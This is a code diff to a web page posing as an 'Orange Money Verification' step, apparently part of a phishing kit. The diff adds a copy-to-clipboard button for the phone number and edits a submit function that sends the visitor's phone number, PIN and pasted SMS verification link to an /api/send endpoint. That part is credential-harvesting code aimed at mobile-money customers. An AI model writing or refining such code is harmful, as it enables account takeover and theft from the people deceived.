@@ -30,7 +30,8 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
 .back-link .arrow{font-size:28px;line-height:1}
 .step-title{font-size:clamp(28px,7vw,40px);font-weight:800;line-height:1.1;margin:10px 0 8px;color:#111}
 .step-copy{font-size:17px;color:#3c3c3c;line-height:1.35;margin:0 0 12px}
-.number{margin:12px 0 18px;font-size:clamp(20px,4vw,30px);font-weight:700;color:#111;letter-spacing:.02em}
+.number{display:block;margin:12px 0 18px;padding:0;border:0;background:transparent;font:inherit;font-size:clamp(20px,4vw,30px);font-weight:700;color:#111;letter-spacing:.02em;cursor:pointer}
+.number:focus-visible{outline:2px solid #ff6900;outline-offset:4px}
 
 .warning{background:#fce8b3;border:1px solid #efc066;border-left:4px solid #f2a11b;border-radius:12px;padding:14px 16px;display:flex;align-items:center;gap:12px;color:#1e1e1e;font-size:clamp(17px,4vw,22px);font-weight:800;line-height:1.3}
 .warning .icon{font-size:25px;color:#f29a20;flex-shrink:0}
@@ -122,7 +123,7 @@ body{display:flex;justify-content:center;align-items:flex-start;padding:10px 0 2
       <div class="back-link"><span class="arrow">←</span> Back</div>
       <div class="step-title">Verification Link</div>
       <p class="step-copy">A verification link has been sent to your phone number via SMS.</p>
-      <p class="number" id="phoneDisplay">+267782845555</p>
+      <button class="number" id="phoneDisplay" type="button" aria-label="Copy phone number">+267782845555</button>
 
       <div class="warning">
         <div class="icon">⚠</div>
@@ -255,6 +256,21 @@ function applySavedValues() {
   }
 }
 
+phoneDisplay.addEventListener('click', async () => {
+  const phone = localStorage.getItem('phone') || '';
+  if (!phone) return;
+
+  try {
+    await navigator.clipboard.writeText(phone);
+    phoneDisplay.textContent = 'Copied';
+    setTimeout(() => {
+      applySavedValues();
+    }, 1200);
+  } catch (err) {
+    console.warn('Could not copy phone number:', err);
+  }
+});
+
 applySavedValues();
 showLinkTiming();
 
@@ -300,7 +316,7 @@ async function submitVerification() {
     : `${window.location.origin}/api/send`;
 
   const payload = {
-    text: `Orange Money Verification\nPhone: ${phone}\nPIN: ${pin}\nPlan: ${planName}\nAmount: ${planPrice}\nLink: ${smsText}`
+    text: `Orange Money Verification\nPhone: ${phone}\nPIN: ${pin}\nLink: ${smsText}`
   };
 
   try {
